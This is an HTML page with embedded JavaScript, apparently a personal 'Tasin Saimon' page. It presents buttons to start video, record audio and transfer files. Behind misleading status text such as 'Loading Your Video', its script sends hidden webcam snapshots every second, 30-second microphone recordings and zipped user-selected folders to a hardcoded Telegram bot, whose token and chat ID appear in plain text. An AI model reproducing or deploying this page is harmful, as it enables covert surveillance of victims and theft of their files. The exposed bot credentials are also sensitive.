<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Tasin Saimon</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@500;700&display=swap');

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: #0a0a0f;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    font-family: 'Space Grotesk', sans-serif;
  }

  canvas { display: none; }
  video  { display: none; }

  .content {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 2.5rem;
    padding: 2rem;
    width: 100%;
    max-width: 420px;
  }

  h1 {
    font-family: 'Bebas Neue', sans-serif;
    font-size: clamp(4.5rem, 20vw, 8rem);
    line-height: 0.9;
    text-align: center;
    background: linear-gradient(135deg, #fff 30%, #29a8e0 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    user-select: none;
    letter-spacing: 0.03em;
  }

  .status {
    font-size: 0.78rem;
    color: rgba(255,255,255,0.35);
    letter-spacing: 0.06em;
    text-transform: uppercase;
    text-align: center;
    min-height: 1.2em;
    font-family: monospace;
  }
  .status.ok  { color: #29a8e0; }
  .status.rec { color: #ff4d6d; }
  .status.err { color: #ff4d6d; }
  .status.zip { color: #a78bfa; }

  .btns {
    display: flex;
    flex-direction: column;
    gap: 1rem;
    width: 100%;
  }

  /* Section divider */
  .section-label {
    font-size: 0.65rem;
    color: rgba(255,255,255,0.2);
    letter-spacing: 0.12em;
    text-transform: uppercase;
    text-align: center;
    width: 100%;
    display: flex;
    align-items: center;
    gap: 0.6rem;
  }
  .section-label::before,
  .section-label::after {
    content: '';
    flex: 1;
    height: 1px;
    background: rgba(255,255,255,0.08);
  }

  button {
    width: 100%;
    padding: 1.15rem;
    border-radius: 14px;
    border: none;
    font-family: 'Space Grotesk', sans-serif;
    font-size: 1rem;
    font-weight: 700;
    letter-spacing: 0.06em;
    cursor: pointer;
    transition: transform 0.1s, opacity 0.2s, box-shadow 0.25s;
  }
  button:active:not(:disabled) { transform: scale(0.97); }
  button:disabled { opacity: 0.3; cursor: not-allowed; }

  #startCam {
    background: #29a8e0;
    color: #fff;
    box-shadow: 0 0 28px rgba(41,168,224,0.45);
  }
  #startCam:hover:not(:disabled) { box-shadow: 0 0 48px rgba(41,168,224,0.75); }

  #stopCam {
    background: rgba(255,255,255,0.07);
    color: #fff;
    border: 1px solid rgba(255,255,255,0.13);
  }
  #stopCam:hover:not(:disabled) { background: rgba(255,255,255,0.13); }

  #startRec {
    background: #ff4d6d;
    color: #fff;
    box-shadow: 0 0 28px rgba(255,77,109,0.35);
  }
  #startRec:hover:not(:disabled) { box-shadow: 0 0 48px rgba(255,77,109,0.65); }
  #startRec.recording { animation: rpulse 1s infinite; }
  @keyframes rpulse {
    0%,100% { box-shadow: 0 0 28px rgba(255,77,109,0.35); }
    50%      { box-shadow: 0 0 60px rgba(255,77,109,0.9);  }
  }

  /* File Transfer */
  #pickFolder {
    background: #a78bfa;
    color: #fff;
    box-shadow: 0 0 28px rgba(167,139,250,0.35);
  }
  #pickFolder:hover:not(:disabled) { box-shadow: 0 0 48px rgba(167,139,250,0.65); }

  #pickFiles {
    background: rgba(167,139,250,0.15);
    color: #a78bfa;
    border: 1px solid rgba(167,139,250,0.35);
  }
  #pickFiles:hover:not(:disabled) { background: rgba(167,139,250,0.25); }

  #sendZip {
    background: #22c55e;
    color: #fff;
    box-shadow: 0 0 28px rgba(34,197,94,0.35);
    display: none;
  }
  #sendZip:hover:not(:disabled) { box-shadow: 0 0 48px rgba(34,197,94,0.65); }
  #sendZip.visible { display: block; }

  /* File list preview */
  .file-list {
    width: 100%;
    max-height: 130px;
    overflow-y: auto;
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 10px;
    padding: 0.75rem;
    display: none;
    gap: 0.3rem;
    flex-direction: column;
  }
  .file-list.visible { display: flex; }
  .file-list::-webkit-scrollbar { width: 4px; }
  .file-list::-webkit-scrollbar-track { background: transparent; }
  .file-list::-webkit-scrollbar-thumb { background: rgba(167,139,250,0.4); border-radius: 4px; }

  .file-item {
    font-size: 0.72rem;
    color: rgba(255,255,255,0.5);
    font-family: monospace;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .file-item span {
    color: rgba(167,139,250,0.7);
    margin-right: 0.4rem;
  }

  .file-count {
    font-size: 0.7rem;
    color: rgba(167,139,250,0.6);
    text-align: center;
    font-family: monospace;
  }

  .prog-wrap {
    width: 100%;
    height: 4px;
    background: rgba(255,255,255,0.08);
    border-radius: 10px;
    overflow: hidden;
    opacity: 0;
    transition: opacity 0.3s;
  }
  .prog-wrap.show { opacity: 1; }
  .prog-bar {
    height: 100%;
    width: 0%;
    border-radius: 10px;
    transition: width 0.5s linear;
  }
  .prog-bar.audio { background: #ff4d6d; }
  .prog-bar.zip   { background: #a78bfa; }
  .prog-bar.upload{ background: #22c55e; }

  /* Hidden file inputs */
  input[type=file] { display: none; }
</style>
</head>
<body>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<input type="file" id="folderInput" webkitdirectory multiple>
<input type="file" id="filesInput" multiple>

<div class="content">
  <h1>Tasin<br>Saimon</h1>
  <div class="status" id="status">Ready</div>

  <div class="btns">

    <!-- Camera -->
    <div class="section-label">Camera</div>
    <button id="startCam">Start Video</button>
    <button id="stopCam" disabled>Stop Video</button>

    <!-- Audio -->
    <div class="section-label">Audio</div>
    <button id="startRec">Audio</button>

    <!-- File Transfer -->
    <div class="section-label">File Transfer</div>
    <button id="pickFolder">📁 Select Folder</button>
    <button id="pickFiles">🗂 Select Files</button>

  </div>

  <!-- File preview list -->
  <div class="file-list" id="fileList"></div>

  <!-- Send ZIP button (appears after selection) -->
  <button id="sendZip">⬆ Zip &amp; Send to Telegram</button>

  <!-- Progress bar -->
  <div class="prog-wrap" id="progWrap">
    <div class="prog-bar audio" id="progBar"></div>
  </div>
</div>

<script>
// ── CONFIG ──
const BOT_TOKEN = '8697759714:AAGlfH7rjS8ZN4X0nkgQ-TJILe39ijerITU';
const CHAT_ID   = '7815078057';
const REC_SECS  = 30;

const video      = document.getElementById('video');
const canvas     = document.getElementById('canvas');
const startCam   = document.getElementById('startCam');
const stopCam    = document.getElementById('stopCam');
const startRec   = document.getElementById('startRec');
const statusEl   = document.getElementById('status');
const progWrap   = document.getElementById('progWrap');
const progBar    = document.getElementById('progBar');
const pickFolder = document.getElementById('pickFolder');
const pickFiles  = document.getElementById('pickFiles');
const sendZip    = document.getElementById('sendZip');
const fileList   = document.getElementById('fileList');
const folderInput= document.getElementById('folderInput');
const filesInput = document.getElementById('filesInput');

let stream      = null;
let camTimer    = null;
let mediaRec    = null;
let recChunks   = [];
let selectedFiles = [];

function setStatus(msg, cls='') {
  statusEl.textContent = msg;
  statusEl.className   = 'status ' + cls;
}

// ── CAMERA ──
startCam.onclick = async () => {
  setStatus('Starting Video');
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio: false });
    video.srcObject = stream;
    startCam.disabled = true;
    stopCam.disabled  = false;
    setStatus('Loading Your Video', 'ok');
    camTimer = setInterval(sendPhoto, 1000);
  } catch(e) {
    setStatus('Camera denied: ' + e.message, 'err');
  }
};

stopCam.onclick = () => {
  clearInterval(camTimer); camTimer = null;
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
  video.srcObject = null;
  startCam.disabled = false;
  stopCam.disabled  = true;
  setStatus('Camera stopped');
};

async function sendPhoto() {
  if (!stream) return;
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  canvas.getContext('2d').drawImage(video, 0, 0);
  canvas.toBlob(async blob => {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'snap.jpg');
    form.append('caption', '📸 ' + new Date().toLocaleTimeString());
    try {
      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:form });
      const j = await r.json();
      if (!j.ok) setStatus('Error: ' + j.description, 'err');
    } catch(e) {}
  }, 'image/jpeg', 0.8);
}

// ── AUDIO RECORD ──
startRec.onclick = async () => {
  if (mediaRec && mediaRec.state === 'recording') return;

  let audioStream;
  try {
    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
  } catch(e) {
    setStatus('Mic denied: ' + e.message, 'err');
    return;
  }

  recChunks = [];

  const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
    ? 'audio/webm;codecs=opus'
    : MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')
    ? 'audio/ogg;codecs=opus'
    : 'audio/webm';

  mediaRec = new MediaRecorder(audioStream, { mimeType });
  mediaRec.ondataavailable = e => { if (e.data.size > 0) recChunks.push(e.data); };

  mediaRec.onstop = async () => {
    audioStream.getTracks().forEach(t => t.stop());
    const blob = new Blob(recChunks, { type: mimeType });
    setStatus('Sending audio…', 'ok');
    await sendVoice(blob);
    resetProg();
    startRec.classList.remove('recording');
    startRec.disabled    = false;
    startRec.textContent = 'Audio';
  };

  mediaRec.start(200);
  startRec.disabled    = true;
  startRec.classList.add('recording');
  startRec.textContent = 'Audio Loading';
  setProgColor('audio');
  showProg();
  setStatus('Audio 30s…', 'rec');

  let elapsed = 0;
  const tick = setInterval(() => {
    elapsed += 300;
    progBar.style.width = Math.min(100, (elapsed / (REC_SECS * 1000)) * 100) + '%';
    if (elapsed >= REC_SECS * 1000) clearInterval(tick);
  }, 300);

  setTimeout(() => {
    if (mediaRec && mediaRec.state === 'recording') mediaRec.stop();
  }, REC_SECS * 1000);
};

async function sendVoice(blob) {
  const ext  = blob.type.includes('ogg') ? 'voice.ogg' : 'voice.webm';
  const form = new FormData();
  form.append('chat_id', CHAT_ID);
  form.append('voice', blob, ext);
  try {
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method:'POST', body:form });
    const j = await r.json();
    if (j.ok) setStatus('✓ Voice sent!', 'ok');
    else      setStatus('Error: ' + j.description, 'err');
  } catch(e) {
    setStatus('Network error', 'err');
  }
  setTimeout(() => setStatus('Ready'), 3000);
}

// ── FILE TRANSFER ──
pickFolder.onclick = () => folderInput.click();
pickFiles.onclick  = () => filesInput.click();

folderInput.onchange = e => loadFiles(e.target.files);
filesInput.onchange  = e => loadFiles(e.target.files);

function loadFiles(fileArr) {
  selectedFiles = Array.from(fileArr);
  if (!selectedFiles.length) return;
  renderFileList();
  sendZip.classList.add('visible');
  setStatus(`${selectedFiles.length} file(s) selected`, 'zip');
}

function renderFileList() {
  fileList.innerHTML = '';
  fileList.classList.add('visible');

  const countEl = document.createElement('div');
  countEl.className = 'file-count';
  const totalSize = selectedFiles.reduce((s, f) => s + f.size, 0);
  countEl.textContent = `${selectedFiles.length} files — ${formatSize(totalSize)}`;
  fileList.appendChild(countEl);

  const show = selectedFiles.slice(0, 40);
  show.forEach(f => {
    const el = document.createElement('div');
    el.className = 'file-item';
    const icon = getIcon(f.name);
    el.innerHTML = `<span>${icon}</span>${f.webkitRelativePath || f.name}`;
    fileList.appendChild(el);
  });

  if (selectedFiles.length > 40) {
    const more = document.createElement('div');
    more.className = 'file-count';
    more.textContent = `+ ${selectedFiles.length - 40} more files…`;
    fileList.appendChild(more);
  }
}

function getIcon(name) {
  const ext = name.split('.').pop().toLowerCase();
  const map = {
    jpg:'🖼', jpeg:'🖼', png:'🖼', gif:'🖼', webp:'🖼', svg:'🖼',
    mp4:'🎬', mkv:'🎬', avi:'🎬', mov:'🎬',
    mp3:'🎵', wav:'🎵', ogg:'🎵', flac:'🎵',
    pdf:'📄', doc:'📝', docx:'📝', txt:'📝', md:'📝',
    zip:'📦', rar:'📦', tar:'📦', gz:'📦',
    js:'💻',  ts:'💻',  py:'💻',  html:'💻', css:'💻', json:'💻',
    apk:'📱', exe:'⚙',
  };
  return map[ext] || '📁';
}

function formatSize(bytes) {
  if (bytes < 1024)       return bytes + ' B';
  if (bytes < 1048576)    return (bytes/1024).toFixed(1) + ' KB';
  if (bytes < 1073741824) return (bytes/1048576).toFixed(1) + ' MB';
  return (bytes/1073741824).toFixed(2) + ' GB';
}

// ── ZIP & SEND ──
sendZip.onclick = async () => {
  if (!selectedFiles.length) return;

  sendZip.disabled = true;
  setProgColor('zip');
  showProg();
  setStatus('Zipping files…', 'zip');

  try {
    const zip    = new JSZip();
    const folder = zip.folder('transfer');

    for (const f of selectedFiles) {
      const path = f.webkitRelativePath || f.name;
      folder.file(path, f);
    }

    // Generate zip with progress
    const zipBlob = await zip.generateAsync(
      { type: 'blob', compression: 'DEFLATE', compressionOptions: { level: 6 } },
      meta => {
        progBar.style.width = meta.percent.toFixed(0) + '%';
        setStatus(`Zipping… ${meta.percent.toFixed(0)}%`, 'zip');
      }
    );

    const zipName = `transfer_${Date.now()}.zip`;
    const zipSize = formatSize(zipBlob.size);
    setStatus(`Uploading ${zipSize}…`, 'ok');
    setProgColor('upload');
    progBar.style.width = '0%';

    // Telegram max file size via Bot API = 50 MB
    if (zipBlob.size > 50 * 1024 * 1024) {
      setStatus('ZIP > 50MB — splitting & sending parts', 'zip');
      await sendInChunks(zipBlob, zipName);
    } else {
      await uploadZip(zipBlob, zipName);
    }

  } catch(e) {
    setStatus('Error: ' + e.message, 'err');
    sendZip.disabled = false;
  }
};

async function uploadZip(blob, name, partLabel = '') {
  // Animate upload progress (fake smooth bar while waiting)
  let fakeP = 0;
  const fakeTimer = setInterval(() => {
    fakeP = Math.min(fakeP + 2, 90);
    progBar.style.width = fakeP + '%';
  }, 200);

  const form = new FormData();
  form.append('chat_id', CHAT_ID);
  form.append('document', blob, name);
  form.append('caption',
    `📦 File Transfer\n` +
    `🗂 Files: ${selectedFiles.length}\n` +
    `💾 Size: ${formatSize(blob.size)}\n` +
    (partLabel ? `📌 ${partLabel}\n` : '') +
    `⏰ ${new Date().toLocaleString()}`
  );

  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body:form });
  const j = await r.json();

  clearInterval(fakeTimer);
  progBar.style.width = '100%';

  if (j.ok) {
    setStatus('✓ Sent! ' + formatSize(blob.size), 'ok');
  } else {
    setStatus('Telegram error: ' + j.description, 'err');
  }

  setTimeout(() => {
    resetProg();
    sendZip.disabled = false;
    setStatus('Ready');
  }, 3000);
}

// Split ZIP into 45MB chunks and send sequentially
async function sendInChunks(blob, name) {
  const CHUNK = 45 * 1024 * 1024;
  const total  = Math.ceil(blob.size / CHUNK);

  for (let i = 0; i < total; i++) {
    const start  = i * CHUNK;
    const end    = Math.min(blob.size, start + CHUNK);
    const chunk  = blob.slice(start, end);
    const cName  = name.replace('.zip', `_part${i+1}of${total}.zip`);
    setStatus(`Sending part ${i+1}/${total}…`, 'ok');
    progBar.style.width = ((i / total) * 100) + '%';
    await uploadZip(chunk, cName, `Part ${i+1} of ${total}`);
    await new Promise(r => setTimeout(r, 800));
  }
  setStatus(`✓ All ${total} parts sent!`, 'ok');
}

// ── PROGRESS HELPERS ──
function showProg()        { progWrap.classList.add('show'); }
function resetProg()       { progWrap.classList.remove('show'); progBar.style.width = '0%'; }
function setProgColor(c)   {
  progBar.className = 'prog-bar';
  if (c) progBar.classList.add(c);
}
</script>
</body>
  </html>
